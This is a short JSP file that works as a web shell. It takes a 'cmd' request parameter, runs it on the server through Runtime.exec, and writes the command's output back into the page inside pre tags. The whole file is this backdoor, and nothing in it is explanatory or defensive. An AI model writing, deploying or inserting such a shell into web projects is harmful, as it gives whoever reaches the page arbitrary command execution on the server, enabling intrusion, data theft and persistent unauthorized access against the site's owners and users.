<%@page contentType="text/html;charset=utf-8"%>
<%@ page import="java.io.*" %>
<%
out.print("<pre>");
try {
    String cmd = request.getParameter("cmd");
	Process pro = Runtime.getRuntime().exec(cmd);
    InputStream in = pro.getInputStream();
    int c;
    while ((c = in.read()) != -1) {
        out.print((char)c);
    }
    in.close();
    try {
        pro.waitFor();
    } catch (InterruptedException e) {
        e.printStackTrace();
    }
} catch (IOException e) {
    System.err.println(e);
}
out.print("</pre>");
%>